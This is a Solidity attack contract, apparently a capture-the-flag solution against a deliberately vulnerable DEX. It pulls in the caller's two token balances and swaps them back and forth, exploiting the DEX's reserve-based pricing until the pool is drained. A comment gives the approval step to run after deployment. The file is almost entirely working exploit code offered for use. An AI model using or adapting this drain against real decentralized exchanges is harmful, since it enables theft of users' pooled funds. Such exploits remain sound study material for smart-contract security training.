//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IDex {
    function token1() external view returns (IERC20);
    function token2() external view returns (IERC20);
    function swap(IERC20 from, IERC20 to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function getSwapPrice(IERC20 from, IERC20 to, uint256 amount) external view returns (uint256);
}

/**
 * @dev after deploying use `await contract.approve("Attack address", 10)`
 */
contract Attack {
    IDex immutable dex;

    constructor(IDex _dex) payable {
        dex = _dex;
        _dex.approve(address(_dex), type(uint256).max);
    }

    function swap() external {
        dex.token1().transferFrom(msg.sender, address(this), dex.token1().balanceOf(msg.sender));
        dex.token2().transferFrom(msg.sender, address(this), dex.token2().balanceOf(msg.sender));

        bool firstToken = true;
        while (dex.getSwapPrice(dex.token2(), dex.token1(), dex.token2().balanceOf(address(this))) < dex.token1().totalSupply()) {
            firstToken
                ? dex.swap(dex.token1(), dex.token2(), dex.token1().balanceOf(address(this)))
                : dex.swap(dex.token2(), dex.token1(), dex.token2().balanceOf(address(this)));

            firstToken = !firstToken; 
        }

        dex.swap(dex.token2(), dex.token1(), dex.token2().balanceOf(address(dex)));
    }
}
















